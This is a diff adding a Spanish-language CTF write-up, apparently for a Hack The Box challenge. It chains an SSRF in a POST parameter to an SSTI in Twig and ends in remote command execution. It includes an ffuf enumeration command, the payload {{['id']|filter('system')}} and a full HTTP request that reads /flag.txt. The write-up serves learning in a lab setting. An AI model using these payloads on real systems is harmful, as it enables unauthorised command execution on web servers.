@@ -1,0 +1,28 @@
+Se nos proporciona una ip con una pagina web que aparentemente no tiene nada interesantee, sin embago ,si observamos las peticiones que se realizan al cargar la pagina vemos 3 POST request que realizamos al servidor las cuales incluyen como parametro una url lo cual podría suponer una vulnerabilidad SSRF. AL testearla vemos que se refleja la peticion si llamamos a localhost por lo que vamos a tirar por aqui.
+
+Jugando un poco con la POST request y la url vemos que nos pide que pasemos como parametro un id y nos devuelve un JSON con informacoin sobre ese id. Si metemos como valor del parametro cosas random nos devuelve un putput or defecto y si intentamos no especificar un id nos devuelve un error.
+
+Lo unico que se me ocurrio en ese momento fue usar ffuf para intentar enumerar este endpoint remoto al cual solo tenemos acceso a traves de la ip que se nos proporciona.
+
+$ ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://truckapi.htb/FUZZ?id%3DFusionExpress01" -u http://94.237.57.65:57337/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-1.0.txt -fs 274,11 -ic -c -e .php
+
+
+Encontramos lo directorios icons y vendor y la pagina index.php que es en la que se nos pide el parametro id. Al inspeccionar vendor nos encontramos con un archivo autoload.php y carpetas composer/ symfony/ y twig/ lo que me recuerda a un template engine. Por esto se me ocurrio probar a ver si el parametro id es vulnerable a una SSTI y efectivamente con el payload {{7*7}} vemos que lo es y que el template engine es en efecto twig.
+
+Al probar distintos payload vemos que obtenemos RCE con {{['id']|filter('system')}} URL encodeado. Despues buscamos la flag y la leemos con el siguiente payload (notese que los espacios estan doblemente URL encodeados es decir " "->"%20"->"%25%32%30"):
+
+POST / HTTP/1.1
+Host: 94.237.57.65:57337
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Origin: http://94.237.57.65:57337
+Connection: keep-alive
+Referer: http://94.237.57.65:57337/
+Pragma: no-cache
+Cache-Control: no-cache
+
+api=http://truckapi.htb/?id%3D{{['cat%25%32%30/flag.txt']|filter('system')}}
